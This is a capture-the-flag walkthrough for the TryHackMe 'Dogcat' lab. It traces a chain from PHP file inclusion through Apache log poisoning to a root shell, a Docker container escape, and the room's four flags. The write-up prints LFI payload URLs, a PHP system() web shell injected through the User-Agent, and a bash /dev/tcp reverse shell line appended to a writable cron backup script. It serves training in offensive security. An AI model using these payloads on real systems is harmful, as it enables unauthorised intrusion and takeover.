# Dogcat - TryHackMe Walkthrough

Today we have another TryHackMe challenge named **Dogcat**, a medium-rated Linux machine.

The objective is to enumerate the target, gain initial access through a vulnerable web application, escalate privileges inside a Docker container, and finally escape the container to obtain the host's root flag.

## Target Information

```text
IP Address: 10.48.150.101
```

---

# Initial Enumeration

As always, the first step is identifying open ports.

```bash
nmap 10.48.150.101
```

### Results

```text
22/tcp open ssh
80/tcp open http
```

Only two services are exposed externally:

* SSH
* HTTP

---

# Service Enumeration

Next, I performed service and version detection.

```bash
nmap -sC -sV 10.48.150.101
```

### Results

```text
22/tcp open ssh OpenSSH 7.6p1 Ubuntu
80/tcp open http Apache 2.4.38
```

Additional information:

```text
Apache/2.4.38 (Debian)
PHP/7.4.3
```

The website title is:

```text
dogcat
```

---

# Web Enumeration

Checking response headers:

```bash
curl http://10.48.150.101/ -I
```

Output:

```text
Apache/2.4.38
PHP/7.4.3
```

The application presents two options:

```text
Dog
Cat
```

At first glance it appears to be a simple image gallery.

---

# Directory Enumeration

I used Gobuster to enumerate content.

```bash
gobuster dir -u http://10.48.150.101/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

### Findings

```text
/index.php
/cat.php
/flag.php
/style.css
```

Interesting observations:

```text
cat.php
flag.php
```

The existence of `flag.php` immediately stood out.

---

# Application Analysis

The TryHackMe room description provided an important hint:

```text
Exploit a PHP application via LFI and break out of a docker container.
```

While testing the application, I noticed the parameter:

```text
?view=dog
```

Changing the parameter revealed unusual behavior.

Example:

```text
?view=cat.php
```

Generated:

```text
Warning: include(cat.php.php)
```

This suggests the application performs:

```php
include($_GET['view'] . ".php")
```

or similar logic.

This immediately points toward a potential Local File Inclusion vulnerability.

---

# LFI Discovery

I started fuzzing the parameter.

```bash
ffuf -u http://10.48.150.101/?view=FUZZ \
-w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -ac
```

Interesting responses included:

```text
/etc/passwd
/etc/shadow
/var/lib/mlocate/mlocate.db
```

This confirmed Local File Inclusion.

---

# Source Code Disclosure

Next, I used PHP filters to retrieve source code.

```text
http://10.48.150.101/?view=php://filter/read=convert.base64-encode/resource=dog/../index
```

The response was Base64 encoded.

After decoding with CyberChef:

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}

$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';

if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') ||
       containsStr($_GET['view'], 'cat')) {

        echo 'Here you go!';
        include $_GET['view'] . $ext;
    }
}
```

Now the vulnerability became clear.

The application only checks whether:

```text
dog
or
cat
```

exists anywhere in the supplied input.

This can be bypassed using directory traversal.

---

# Log File Inclusion

Using the discovered LFI:

```text
http://10.48.150.101/?view=./dog../../../../../../var/log/apache2/access.log&ext=
```

The Apache access log became visible.

Example output:

```text
127.0.0.1 - - GET /
127.0.0.1 - - GET /
```

This opens the door for log poisoning.

---

# Log Poisoning

I modified my User-Agent header:

```php
<?php system($_GET['cmd']);?>
```

Then sent a request through Burp Suite.

After revisiting the poisoned log file:

```text
?view=./dog../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
```

The response revealed:

```text
www-data
```

Remote command execution was achieved.

---

# Reverse Shell

To obtain a shell, I executed a PHP one-liner through the vulnerable parameter.

A reverse shell connected back successfully.

After receiving the shell:

```bash
script /dev/null -c bash
```

Followed by:

```bash
stty raw -echo
export TERM=xterm-256color
```

The shell became fully interactive.

Current user:

```text
www-data
```

---

# Flag 1

Inside the web root:

```bash
cat flag.php
```

Output:

```text
THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
```

---

# Sudo Enumeration

Checking privileges:

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD: /usr/bin/env
```

Interesting.

The `env` binary can be executed as root.

---

# Privilege Escalation Inside Container

Using the allowed binary:

```bash
sudo /usr/bin/env /bin/bash
```

Result:

```text
root
```

We are now root inside the container.

---

# Flag 2

While enumerating:

```bash
cat flag2_QMW7JvaY2LvK.txt
```

Output:

```text
THM{LF1_t0_RC3_aec3fb}
```

---

# Docker Discovery

While exploring the filesystem:

```bash
ls -lah /
```

Output:

```text
.dockerenv
```

This confirms that the current environment is a Docker container.

---

# Flag 3

Inside root's directory:

```bash
cat flag3.txt
```

Output:

```text
THM{D1ff3r3nt_3nv1ronments_874112}
```

At this stage:

```text
Root inside container
≠
Root on host
```

A container escape is still required.

---

# Docker Escape

While reviewing files under:

```text
/opt/backups
```

I discovered:

```bash
cat backup.sh
```

Contents:

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

The script was writable.
```echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.138.6/1234 0>&1'" >> backup.sh```

I modified the script and waited for it to execute.

Shortly afterward a connection was received from the host system.

---

# Host Access

The incoming shell landed directly on:

```text
root@dogcat
```

This confirmed successful escape from the Docker container.

Checking contents:

```bash
ls
```

Output:

```text
container
flag4.txt
```

---

# Final Flag

```bash
cat flag4.txt
```

Output:

```text
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

---

# Flags Collected

## Flag 1

```text
THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
```

## Flag 2

```text
THM{LF1_t0_RC3_aec3fb}
```

## Flag 3

```text
THM{D1ff3r3nt_3nv1ronments_874112}
```

## Flag 4

```text
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

---

# Attack Path Summary

```text
Nmap Enumeration
        ↓
Web Application Discovery
        ↓
Directory Enumeration
        ↓
LFI Discovery
        ↓
PHP Source Disclosure
        ↓
Apache Log File Inclusion
        ↓
Log Poisoning
        ↓
Remote Command Execution
        ↓
Reverse Shell
        ↓
www-data Access
        ↓
Sudo Enumeration
        ↓
Root Inside Container
        ↓
Docker Identification
        ↓
Writable Backup Script
        ↓
Container Escape
        ↓
Root On Host
        ↓
Final Flag
```

---

# Conclusion

Dogcat is an excellent machine demonstrating how a seemingly simple Local File Inclusion vulnerability can be chained into full system compromise. The attack path begins with PHP source disclosure, progresses through log poisoning and remote command execution, continues with privilege escalation inside a Docker container, and finally ends with a successful container escape to obtain root access on the host.

This room provides practical experience with:

* Web Enumeration
* Local File Inclusion (LFI)
* PHP Filter Abuse
* Source Code Disclosure
* Apache Log Poisoning
* Remote Command Execution
* Reverse Shell Handling
* Linux Privilege Escalation
* Docker Enumeration
* Container Escape Techniques
* Multi-Stage Exploitation Chains
